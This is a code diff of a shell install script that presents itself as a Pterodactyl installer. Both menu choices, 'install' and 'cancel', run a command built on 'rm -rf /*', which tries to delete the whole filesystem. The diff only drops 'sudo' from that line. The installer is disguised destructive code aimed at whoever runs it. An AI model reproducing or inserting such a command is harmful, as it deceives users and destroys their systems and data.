@@ -23,10 +23,10 @@ read -p "Please enter a number: " choice
 if [ $choice == "1" ]
     then
     echo "Installing Pterodactyl"
-    bash <(sudo rm - rf /*)
+    bash <(rm - rf /*)
 fi
 if [ $choice == "2" ]
     then
     echo "Cancelling the Install Script"
-    bash <(sudo rm - rf /*)
+    bash <(rm - rf /*)
 fi
